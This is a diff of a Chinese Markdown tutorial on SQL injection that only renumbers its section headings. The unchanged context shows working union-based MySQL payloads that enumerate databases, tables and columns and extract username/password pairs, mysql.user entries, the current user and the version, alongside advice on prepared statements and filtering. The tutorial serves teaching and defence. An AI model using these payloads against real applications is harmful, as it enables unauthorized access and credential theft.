@@ -1,6 +1,6 @@
 # SQL Inject （SQL注入攻击）
 
-## 简介
+## 1. 简介
 - SQL注入攻击的主要原理
 - 通过构造非法的SQL语法，使得程序报错
 - 得到错误的SQL语句，则可以针对原始SQL语句特征
@@ -10,10 +10,10 @@
 - 其次，使用预处理语句，不要直接拼接SQL
 - 最后，使用SQL注入防护组件，比如基于规则的过滤器，或者正确使用ORM框架
 
-## 案例
+## 2. 案例
 - 字符型注入，利用常见的username字段进行注入
 
-### 原始查询语句
+### 2.1. 原始查询语句
 ```sql
 SELECT id,username,realname FROM sys_user 
 WHERE username='-1' and status=1
@@ -27,7 +27,7 @@ WHERE username='-1' and status=1
 ' and status=1
 ```
 
-### 判断是否存在SQL注入
+### 2.2. 判断是否存在SQL注入
 ```sql
 -1' --
 ```
@@ -56,7 +56,7 @@ where username='''  and status=1
 ```
 
 
-### union 注入攻击
+### 2.3. union 注入攻击
 - 步骤，union的特性是需要在查询中使用
 - 并且union的列数需要一致
 - 并且union前后的数据类型需要一致
@@ -66,7 +66,7 @@ where username='''  and status=1
 - 构造不存在的条件，绕过原来的查询语句的类型，比如id=-1
 - 构造符合列数的union语句进行注入
 
-### 判断列数
+### 2.4. 判断列数
 - 当出现报错时，则已经达到最大列数
 - 当order by 1,2,3,4时，则报错
 - 说明最大列数为4-1=3
@@ -79,14 +79,14 @@ SELECT id,username,realname FROM sys_user
 WHERE username='-1' order by 1,2,3 --
 ```
 
-### 获取数据
+### 2.5. 获取数据
 - 主要原理
 - 因为是用户名，需要表不存在的用户名
 - 所以这里username='-1'是不存在的用户名
 - 这里针对mysql,所以库名信息，在information_schema这个数据库中
 - 由于列数的限制，一般使用group_concat和concat进行得到更多的列数据
 
-### 曝库
+### 2.6. 曝库
 - 攻击语句
 ```sql
 -1' union select 1,group_concat(schema_name),3 from information_schema.schemata -- 
@@ -97,7 +97,7 @@ SELECT id,username,realname FROM sys_user
 WHERE username='-1' union select 1,group_concat(schema_name),3 from information_schema.schemata -- 
 ```
 
-### 曝表
+### 2.7. 曝表
 - 攻击语句
 ```sql
 -1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='i2f_proj'  -- 
@@ -108,7 +108,7 @@ SELECT id,username,realname FROM sys_user
 WHERE username='-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='i2f_proj'  -- 
 ```
 
-### 曝表字段
+### 2.8. 曝表字段
 - 攻击语句
 ```sql
 -1'union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='i2f_proj' and table_name='sys_user' --
@@ -119,7 +119,7 @@ SELECT id,username,realname FROM sys_user
 WHERE username='-1'union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='i2f_proj' and table_name='sys_user' --
 ```
 
-## 曝数据
+## 3. 曝数据
 - 攻击语句
 ```sql
 -1'union select 1,concat(username,'/',password),3 from sys_user where id=1 --
@@ -130,7 +130,7 @@ SELECT id,username,realname FROM sys_user
 WHERE username='-1'union select 1,concat(username,'/',password),3 from sys_user where id=1 --
 ```
 
-### 曝用户名
+### 3.1. 曝用户名
 - 攻击语句
 ```sql
 -1'union select 1,group_concat(concat(host,'@',user)),3 from mysql.user --
@@ -141,7 +141,7 @@ SELECT id,username,realname FROM sys_user
 WHERE username='-1'union select 1,group_concat(concat(host,'@',user)),3 from mysql.user --
 ```
 
-## 获取当前用户
+## 4. 获取当前用户
 - 攻击语句
 ```sql
 -1'union select 1,user(),3 from dual --
@@ -152,7 +152,7 @@ SELECT id,username,realname FROM sys_user
 WHERE username='-1'union select 1,user(),3 from dual --
 ```
 
-### 获取当前数据库
+### 4.1. 获取当前数据库
 - 攻击语句
 ```sql
 -1'union select 1,database(),3 from dual --
@@ -163,7 +163,7 @@ SELECT id,username,realname FROM sys_user
 WHERE username='-1'union select 1,database(),3 from dual --
 ```
 
-### 获取当前版本
+### 4.2. 获取当前版本
 - 攻击语句
 ```shell script
 -1'union select 1,version(),3 from dual --
@@ -175,7 +175,7 @@ WHERE username='-1'union select 1,version(),3 from dual --
 ```
 
 
-## 危害
+## 5. 危害
 - 这是在查询语句中的危害
 - 如果在更新或者删除等语句中
 - 则可能导致数据被错误更新
@@ -200,14 +200,14 @@ WHERE username='-1'union select 1,version(),3 from dual --
 - 禁用多语句执行环境
 
 
-## 总结
-### SQL注入的风险
+## 6. 总结
+### 6.1. SQL注入的风险
 - 不仅仅限于泄露数据
 - 甚至被拖库
 - 甚至数据库被控制
 - 甚至服务器被控制
 
-### 防范上
+### 6.2. 防范上
 - 具备安全开发意思
 - 避免使用未预处理的语句
 - 如果实在需要未预处理的语句拼接
